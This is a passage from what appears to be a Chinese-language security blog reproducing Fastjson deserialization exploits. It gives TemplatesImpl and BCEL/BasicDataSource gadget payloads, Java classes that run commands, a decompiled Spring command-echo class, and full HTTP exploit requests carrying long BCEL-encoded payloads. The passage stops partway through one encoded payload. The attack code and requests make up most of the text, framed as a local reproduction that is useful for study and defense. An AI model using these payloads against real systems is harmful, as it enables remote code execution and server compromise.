class=\"string\">&quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;</span>+byteCode+<span class=\"string\">&quot;\\&quot;],&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;&#x27;_name&#x27;:&#x27;Evil&#x27;,&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;</span>;</span><br><span class=\"line\">        System.out.println(payload);</span><br><span class=\"line\"><span class=\"comment\">//反序列化</span></span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">object</span> <span class=\"operator\">=</span> JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>运行该类，成功反序列化</p>\n<p><img src=\"qSJhjl2bXeNe6ppqYEW6mGZg6lN_t2cPwSV6gRHUoVg.png\" alt=\"image\"></p>\n<h1 id=\"BasicDataSource（BCEL字节码利用）\"><a href=\"#BasicDataSource（BCEL字节码利用）\" class=\"headerlink\" title=\"BasicDataSource（BCEL字节码利用）\"></a>BasicDataSource（BCEL字节码利用）</h1><p>条件：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">Java <span class=\"number\">8</span>u251以后，bcel类被删除</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>利用链：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">Tomcat <span class=\"number\">8.0</span>以下使用 的链</span><br><span class=\"line\">org.apache.tomcat.dbcp.dbcp.BasicDataSource</span><br><span class=\"line\"></span><br><span class=\"line\">Tomcat <span class=\"number\">8.0</span>以后使用 的链（内置的 DBCP2；与Tomcat容器集成使用）</span><br><span class=\"line\">org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span><br><span class=\"line\"></span><br><span class=\"line\">数据库DBCP链接池（项目的通用数据库连接池实现，具有灵活的配置选项，并且可以自动管理和重复使用预配置数量的数据库连接来提升应用程序性能。不同项目间通用或需要更加灵活的配置选项）</span><br><span class=\"line\">org.apache.commons.dbcp.BasicDataSource</span><br></pre></td></tr></table></figure>\n<p>BasicDataSource攻击链只能用于Fastjson 1.2.24及更低版本；1.2.25 以后autotype默认开启</p>\n<p>而在tomcat中的 com.sun.org.apache.bcel.internal.util.ClassLoader 的loadclass方法中可以进行bcel字节码的加载。</p>\n<p>在payload包里面创建一个恶意类Test.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>或者Exploit_win_calc.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Exploit_win_calc</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Exploit_win_calc</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            String[] var1 = <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;calc.exe&quot;</span>&#125;;</span><br><span class=\"line\">            <span class=\"type\">Process</span> <span class=\"variable\">var2</span> <span class=\"operator\">=</span> Runtime.getRuntime().exec(var1);</span><br><span class=\"line\">            var2.waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception var3) &#123;</span><br><span class=\"line\">            var3.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] var0)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Exploit_win_calc</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>创建一个实现类fastJsonBecl.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck1;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">fastJsonBecl</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] argv)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;E:\\\\code\\\\java_code\\\\vulnerability_Recurrence\\\\fastJsonSecNoNetwork\\\\src\\\\main\\\\java\\\\payload\\\\Exploit_win_calc.class&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">code</span> <span class=\"operator\">=</span> Utility.encode(bytes,<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">poc</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; &#123;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; \\&quot;aaa\\&quot;: &#123;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; \\&quot;@type\\&quot;: \\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\&quot;,\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; \\&quot;driverClassLoader\\&quot;: &#123;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; \\&quot;@type\\&quot;: \\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\\&quot;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; &#125;,\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; \\&quot;driverClassName\\&quot;: \\&quot;$$BCEL$$&quot;</span>+ code+ <span class=\"string\">&quot;\\&quot;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; &#125;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot; &#125;: \\&quot;bbb\\&quot;\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        System.out.println(poc);</span><br><span class=\"line\">        JSON.parse(poc);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>运行之后只输出了poc没有其它</p>\n<p><img src=\"MRxwNLApm63jH7JPpwIA5YKELLg4Te2IQB4qQStOIaM.png\" alt=\"image\"></p>\n<p>原因是缺少了tomcat-dbcp依赖，在pom.xml中添加之后，更新一下即可</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.tomcat<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>tomcat-dbcp<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>9.0.8<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>更新</p>\n<p><img src=\"wI2kunRadrOvUH-GcbIarrJgAV9NRGzTqnLMqKor4ps.png\" alt=\"image\"></p>\n<p>运行</p>\n<p><img src=\"tmT5IKKsM4I0A-MQGWkwC8Ok2fBjBsG-vYYpOFUBjbM.png\" alt=\"image\"></p>\n<h2 id=\"BCEL的EXP\"><a href=\"#BCEL的EXP\" class=\"headerlink\" title=\"BCEL的EXP\"></a>BCEL的EXP</h2><p>可用于解决不出网利用。 需要注意在Java 8u251以后，bcel类被删除。</p>\n<p>tomcat7</p>\n<p>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p>\n<p>tomcat8及其以后</p>\n<p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p>\n<h2 id=\"执行命令回显-Spring\"><a href=\"#执行命令回显-Spring\" class=\"headerlink\" title=\"执行命令回显(Spring)\"></a>执行命令回显(Spring)</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /json HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">9092</span></span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">cmd: whoami</span><br><span class=\"line\">Content-Length: <span class=\"number\">3327</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;@type&quot;</span>: <span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;x&quot;</span>:&#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;@type&quot;</span>: <span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;@type&quot;</span>: <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassName&quot;</span>: <span class=\"string\">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;: <span class=\"string\">&quot;x&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"EXP-Spring\"><a href=\"#EXP-Spring\" class=\"headerlink\" title=\"EXP(Spring)\"></a>EXP(Spring)</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class=\"line\"><span class=\"comment\">// (powered by Fernflower decompiler)</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">package</span> com.fastjson.vul;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SpringEcho</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">SpringEcho</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">Class</span> <span class=\"variable\">var0</span> <span class=\"operator\">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class=\"string\">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Method</span> <span class=\"variable\">var1</span> <span class=\"operator\">=</span> var0.getMethod(<span class=\"string\">&quot;getRequestAttributes&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Object</span> <span class=\"variable\">var2</span> <span class=\"operator\">=</span> var1.invoke((Object)<span class=\"literal\">null</span>);</span><br><span class=\"line\">            var0 = Thread.currentThread().getContextClassLoader().loadClass(<span class=\"string\">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class=\"line\">            var1 = var0.getMethod(<span class=\"string\">&quot;getResponse&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Method</span> <span class=\"variable\">var3</span> <span class=\"operator\">=</span> var0.getMethod(<span class=\"string\">&quot;getRequest&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Object</span> <span class=\"variable\">var4</span> <span class=\"operator\">=</span> var1.invoke(var2);</span><br><span class=\"line\">            <span class=\"type\">Object</span> <span class=\"variable\">var5</span> <span class=\"operator\">=</span> var3.invoke(var2);</span><br><span class=\"line\">            <span class=\"type\">Method</span> <span class=\"variable\">var6</span> <span class=\"operator\">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class=\"string\">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class=\"string\">&quot;getWriter&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Method</span> <span class=\"variable\">var7</span> <span class=\"operator\">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class=\"string\">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class=\"string\">&quot;getHeader&quot;</span>, String.class);</span><br><span class=\"line\">            var7.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            var6.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"type\">Object</span> <span class=\"variable\">var8</span> <span class=\"operator\">=</span> var6.invoke(var4);</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">var9</span> <span class=\"operator\">=</span> (String)var7.invoke(var5, <span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">            String[] var10 = <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[<span class=\"number\">3</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toUpperCase().contains(<span class=\"string\">&quot;WIN&quot;</span>)) &#123;</span><br><span class=\"line\">                var10[<span class=\"number\">0</span>] = <span class=\"string\">&quot;cmd&quot;</span>;</span><br><span class=\"line\">                var10[<span class=\"number\">1</span>] = <span class=\"string\">&quot;/c&quot;</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                var10[<span class=\"number\">0</span>] = <span class=\"string\">&quot;/bin/sh&quot;</span>;</span><br><span class=\"line\">                var10[<span class=\"number\">1</span>] = <span class=\"string\">&quot;-c&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            var10[<span class=\"number\">2</span>] = var9;</span><br><span class=\"line\">            var8.getClass().getDeclaredMethod(<span class=\"string\">&quot;println&quot;</span>, String.class).invoke(var8, (<span class=\"keyword\">new</span> <span class=\"title class_\">Scanner</span>(Runtime.getRuntime().exec(var10).getInputStream())).useDelimiter(<span class=\"string\">&quot;\\\\A&quot;</span>).next());</span><br><span class=\"line\">            var8.getClass().getDeclaredMethod(<span class=\"string\">&quot;flush&quot;</span>).invoke(var8);</span><br><span class=\"line\">            var8.getClass().getDeclaredMethod(<span class=\"string\">&quot;close&quot;</span>).invoke(var8);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception var11) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"执行命令回显-Tomcat\"><a href=\"#执行命令回显-Tomcat\" class=\"headerlink\" title=\"执行命令回显(Tomcat)\"></a>执行命令回显(Tomcat)</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">PUT /tmall/admin/product/173 HTTP/1.1</span><br><span class=\"line\">Host: 192.168.75.154:8090</span><br><span class=\"line\">User-Agent: Mozilla/9.0 (Macintosh; M2 Mac OS X 16.12; rv:129.0) Gecko/20230101 Firefox/169.0</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class=\"line\">X-Requested-With: XMLHttpRequest</span><br><span class=\"line\">Content-Length: 9784</span><br><span class=\"line\">Testecho:1</span><br><span class=\"line\">Testcmd:id</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;@type&quot;:&quot;org.apache.commons.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$